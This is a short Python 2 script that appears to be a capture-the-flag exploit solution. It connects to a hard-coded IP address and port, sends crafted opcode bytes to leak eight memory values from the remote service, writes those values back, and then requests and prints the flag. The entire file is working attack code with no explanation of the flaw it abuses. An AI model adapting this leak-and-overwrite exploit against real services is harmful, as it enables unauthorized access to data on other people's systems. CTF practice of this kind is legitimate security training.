import socket
from struct import pack, unpack
from binascii import hexlify
import telnetlib

host="54.85.89.65" 
port=8888

def q(a):
    return pack("<I", a)

def r(a):
    return unpack("<I", a)

def interact(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def leak(s):
    leaked = []
    for i in range(0,8):
        byte = chr(160+i+8)
        s.send(byte)
        resp = s.recv(4)
        leaked.append(r(resp)[0])
    return leaked

def write(s, leaked):
    for i in range(0, 8):
        byte = chr(224+i)
        s.send(byte)
        s.send(q(leaked[i]))

def read_flag(s):
    s.send(chr(128))
    return s.recv(1024)

s=socket.create_connection((host,port))
print s.recv(1024)
print "[.] leaking values..."
leaked = leak(s)
print "[+] values leaked :"
print leaked

print "[.] settings values now.."
write(s, leaked)
print "[+] values written"

print "[+] Flag :" + read_flag(s)
